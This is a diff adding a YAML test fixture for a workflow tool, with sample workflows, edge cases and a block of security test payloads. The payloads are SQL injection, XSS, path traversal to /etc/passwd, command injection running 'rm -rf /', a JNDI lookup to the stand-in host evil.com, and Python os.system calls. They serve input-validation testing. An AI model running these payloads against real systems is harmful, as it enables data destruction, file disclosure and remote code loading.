@@ -1,0 +1,71 @@
+# Test data for validation and parsing tests
+valid_workflow:
+  name: Test Workflow
+  description: A simple test workflow
+  command: echo "Hello, World!"
+  tags:
+    - test
+    - example
+  shells:
+    - bash
+    - zsh
+
+invalid_workflow_missing_name:
+  description: Missing name field
+  command: echo "test"
+
+invalid_workflow_empty_command:
+  name: Empty Command
+  description: Test with empty command
+  command: ""
+
+complex_workflow:
+  name: Complex Workflow
+  description: A complex workflow with multiple features
+  command: |
+    if [ -f "requirements.txt" ]; then
+      pip install -r requirements.txt
+    fi
+    python -m pytest tests/
+  arguments:
+    - name: test_path
+      description: Path to test files
+      default_value: "tests/"
+    - name: verbose
+      description: Enable verbose output
+      default_value: "false"
+  tags:
+    - python
+    - testing
+    - development
+  shells:
+    - bash
+    - zsh
+  requirements:
+    - python
+    - pip
+
+# Security test payloads
+security_test_cases:
+  sql_injection: "'; DROP TABLE users; --"
+  xss_attack: "<script>alert('xss')</script>"
+  path_traversal: "../../etc/passwd"
+  command_injection: "$(rm -rf /)"
+  template_injection: "{{7*7}}"
+  ldap_injection: "${jndi:ldap://evil.com/exploit}"
+  python_exec: "eval(compile('print(1)', '', 'exec'))"
+  os_command: "__import__('os').system('id')"
+
+# Edge cases for testing
+edge_cases:
+  empty_string: ""
+  null_value: null
+  very_long_string: "a" * 10000
+  unicode_string: "Hello 世界 🌍"
+  special_chars: "!@#$%^&*()_+-=[]{}|;':\",./<>?"
+  nested_structure:
+    level1:
+      level2:
+        level3:
+          level4:
+            value: "deep_nested"
